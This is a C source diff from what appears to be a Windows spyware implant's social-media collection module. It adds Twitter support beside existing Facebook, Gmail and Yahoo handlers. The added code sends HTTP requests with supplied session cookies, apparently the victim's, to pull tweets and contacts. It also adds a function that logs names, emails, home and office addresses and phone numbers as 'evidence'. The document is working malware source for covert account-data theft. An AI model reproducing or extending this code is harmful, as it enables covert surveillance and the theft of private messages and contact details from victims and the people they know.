@@ -10,6 +10,7 @@
 #include "facebook.h"
 #include "gmail.h"
 #include "yahoo.h"
+#include "twitter.h"
 #include "cookies.h"
 #include "proto.h"
 #include "crypt.h"
@@ -23,6 +24,7 @@ HINTERNET gHttpSocialSession = NULL;
 SOCIAL_ENTRY pSocialEntry[SOCIAL_ENTRY_COUNT];
 SOCIAL_LOGS lpSocialLogs[MAX_SOCIAL_QUEUE];
 SOCIAL_TIMESTAMPS pSocialTimeStamps[SOCIAL_MAX_ACCOUNTS];
+
 
 
 DWORD SocialGetLastTimestamp(__in LPSTR strUser, __out LPDWORD dwHighPart)
@@ -160,6 +162,147 @@ VOID SocialWinHttpSetup(__in LPWSTR strDestUrl)
 	}
 
 	WinHttpSetOption(gHttpSocialSession, WINHTTP_OPTION_SECURITY_FLAGS, &dwOptions, sizeof (DWORD) );
+}
+
+/* similar to HttpSocialRequest */
+DWORD XmlHttpSocialRequest(
+	__in LPWSTR strHostName, 
+	__in LPWSTR strHttpVerb, 
+	__in LPWSTR strHttpRsrc, 
+	__in DWORD dwPort, 
+	__in LPBYTE *lpSendBuff, 
+	__in DWORD dwSendBuffSize, 
+	__out LPBYTE *lpRecvBuff, 
+	__out DWORD *dwRespSize, 
+	__in LPSTR strCookies,
+	__in LPWSTR strReferer)
+{
+	WCHAR *cookies_w;
+	DWORD cookies_len;
+	DWORD dwStatusCode = 0;
+	DWORD dwTemp = sizeof(dwStatusCode);
+	DWORD n_read;
+	char *types[] = { "*\x0/\x0*\x0",0 };
+	HINTERNET hConnect, hRequest;
+	BYTE *ptr;
+	DWORD flags = 0;
+	BYTE temp_buffer[8*1024];
+
+	//make sure the buffer is initialized
+	*lpRecvBuff = NULL;
+
+	/* convert cookies string */
+	cookies_len = strlen(strCookies);
+	if (cookies_len == 0)
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+
+	cookies_len++;
+	cookies_w = (WCHAR *)zalloc(cookies_len * sizeof(WCHAR));
+	if (!cookies_w)
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+
+	_snwprintf_s(cookies_w, cookies_len, _TRUNCATE, L"%S", strCookies);		
+
+
+
+	if (dwPort == 443)
+		flags = WINHTTP_FLAG_SECURE;
+
+	if (!(hConnect = WinHttpConnect(gHttpSocialSession, (LPCWSTR) strHostName, (INTERNET_PORT)dwPort, 0))) 
+	{
+		zfree(cookies_w);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if ( !(hRequest = WinHttpOpenRequest(hConnect, strHttpVerb, strHttpRsrc, NULL, strReferer, (LPCWSTR *) types, flags)) ) 
+	{
+		zfree(cookies_w);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+			if (!WinHttpAddRequestHeaders(hRequest, L"X-Requested-With: XMLHttpRequest", -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) 
+	{
+		
+		zfree(cookies_w);
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if (!WinHttpAddRequestHeaders(hRequest, L"Accept: application/json, text/javascript, */*; q=0.01", -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) // FIXME array-izza la stringa
+	{
+		
+		zfree(cookies_w);
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if (!WinHttpAddRequestHeaders(hRequest, cookies_w, -1, WINHTTP_ADDREQ_FLAG_REPLACE | WINHTTP_ADDREQ_FLAG_ADD)) 
+	{
+		zfree(cookies_w);
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if (!WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, lpSendBuff, dwSendBuffSize, dwSendBuffSize, NULL))
+	{
+		zfree(cookies_w);
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+	zfree(cookies_w);
+
+	// Legge la risposta
+	if(!WinHttpReceiveResponse(hRequest, 0)) 
+	{
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	if (!WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE| WINHTTP_QUERY_FLAG_NUMBER, NULL, &dwStatusCode, &dwTemp, NULL ))  
+	{
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+	
+	if (dwStatusCode != HTTP_STATUS_OK) 
+	{
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_BAD_COOKIE;
+	}
+
+	*dwRespSize = 0;	
+	//spostato all'inizio della funzione perchè causava un leak in caso di errore prima di questo punto (free di questa variabile non inizializzata)
+	//*lpRecvBuff = NULL;
+	for(;;) 
+	{
+		if (!WinHttpReadData(hRequest, temp_buffer, sizeof(temp_buffer), &n_read) || n_read==0 || n_read>sizeof(temp_buffer))
+			break;
+		if (!(ptr = (BYTE *)realloc((*lpRecvBuff), (*dwRespSize) + n_read + sizeof(WCHAR))))
+			break;
+		*lpRecvBuff = ptr;
+		memcpy(((*lpRecvBuff) + (*dwRespSize)), temp_buffer, n_read);
+		*dwRespSize = (*dwRespSize) + n_read;
+		// Null-termina sempre il buffer
+		memset(((*lpRecvBuff) + (*dwRespSize)), 0, sizeof(WCHAR));
+	} 
+
+	if (!(*lpRecvBuff)) 
+	{
+		WinHttpCloseHandle(hRequest);
+		WinHttpCloseHandle(hConnect);
+		return SOCIAL_REQUEST_NETWORK_PROBLEM;
+	}
+
+	WinHttpCloseHandle(hRequest);
+	WinHttpCloseHandle(hConnect);
+	return SOCIAL_REQUEST_SUCCESS;
 }
 
 // Invia una richiesta HTTP e legge la risposta
@@ -317,6 +460,11 @@ VOID InitSocialEntries()
 		wcscpy_s(pSocialEntry[n].strDomain, YAHOO_DOMAIN);
 		pSocialEntry[n].fpRequestHandler = YahooMessageHandler;
 		n++;
+
+		/* twitter posts */
+		wcscpy_s(pSocialEntry[n].strDomain, TWITTER_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = HandleTwitterTweets;//TwitterMessageHandler;
+		n++;
 	}
 
 	if (ConfIsModuleEnabled(L"addressbook"))
@@ -336,6 +484,13 @@ VOID InitSocialEntries()
 		wcscpy_s(pSocialEntry[n].strDomain, YAHOO_DOMAIN);
 		pSocialEntry[n].fpRequestHandler = YahooContactHandler;
 		n++;
+
+	
+		/* twitter contacts */
+		wcscpy_s(pSocialEntry[n].strDomain, TWITTER_DOMAIN);
+		pSocialEntry[n].fpRequestHandler = HandleTwitterContacts; //TwitterContactHandler;
+		n++;
+
 	}
 
 	// load timestamps
@@ -472,6 +627,10 @@ BOOL QueueSociallog(LPBYTE lpEvBuff, DWORD dwEvSize)
 			lpSocialLogs[i].dwSize = dwEvSize;
 			lpSocialLogs[i].lpBuffer = lpEvBuff;
 
+#ifdef _DEBUG
+			OutputDebug(L"[*] %S evidence size %d\n", __FUNCTION__, dwEvSize);
+#endif
+
 			return TRUE;
 		}
 	}
@@ -561,6 +720,45 @@ VOID SocialLogContactW(
 		zfree(lpEvBuffer);
 }
 
+
+VOID SocialLogContactA(
+	__in DWORD dwProgram,
+	__in LPSTR strUserName,
+	__in LPSTR strEmail,
+	__in LPSTR strCompany,
+	__in LPSTR strHomeAddr,
+	__in LPSTR strOfficeAddr,
+	__in LPSTR strOfficePhone,
+	__in LPSTR strMobilePhone,
+	__in LPSTR strHomePhone,
+	__in LPSTR strScreenName, 
+	__in LPSTR strFacebookProfile,
+	__in DWORD dwFlags)
+{
+	LPWSTR strUserNameW = UTF8_2_UTF16(strUserName);
+	LPWSTR strEmailW = UTF8_2_UTF16(strEmail);
+	LPWSTR strCompanyW = UTF8_2_UTF16(strCompany);
+	LPWSTR strHomeAddrW = UTF8_2_UTF16(strHomeAddr);
+	LPWSTR strOfficeAddrW = UTF8_2_UTF16(strOfficeAddr);
+	LPWSTR strOfficePhoneW = UTF8_2_UTF16(strOfficePhone);
+	LPWSTR strMobilePhoneW = UTF8_2_UTF16(strMobilePhone);
+	LPWSTR strHomePhoneW = UTF8_2_UTF16(strHomePhone);
+	LPWSTR strScreenNameW = UTF8_2_UTF16(strScreenName);
+	LPWSTR strFacebookProfileW = UTF8_2_UTF16(strFacebookProfile);
+
+	SocialLogContactW(dwProgram, strUserNameW, strEmailW, strCompanyW, strHomeAddrW, strOfficeAddrW, strOfficePhoneW, strMobilePhoneW, strHomePhoneW, strScreenNameW, strFacebookProfileW, dwFlags);
+
+	zfree(strUserNameW);
+	zfree(strEmailW);
+	zfree(strCompanyW);
+	zfree(strHomeAddrW);
+	zfree(strOfficeAddrW);
+	zfree(strOfficePhoneW);
+	zfree(strMobilePhoneW);
+	zfree(strHomePhoneW);
+	zfree(strScreenNameW);
+	zfree(strFacebookProfileW);
+}
 
 
 VOID SocialLogIMMessageW(
